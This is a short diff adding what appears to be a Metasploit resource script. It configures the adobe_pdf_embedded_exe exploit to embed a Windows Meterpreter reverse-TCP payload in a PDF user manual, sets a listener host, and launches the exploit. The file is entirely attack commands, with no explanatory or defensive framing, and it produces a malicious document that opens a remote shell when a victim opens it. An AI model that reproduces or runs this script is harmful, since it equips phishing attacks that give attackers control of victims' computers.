@@ -1,0 +1,5 @@
+use exploit/windows/fileformat/adobe_pdf_embedded_exe
+set INFILENAME /usr/share/set/readme/User_Manual.pdf
+set payload windows/meterpreter/reverse_tcp
+set LHOST 127.0.0.1
+exploit
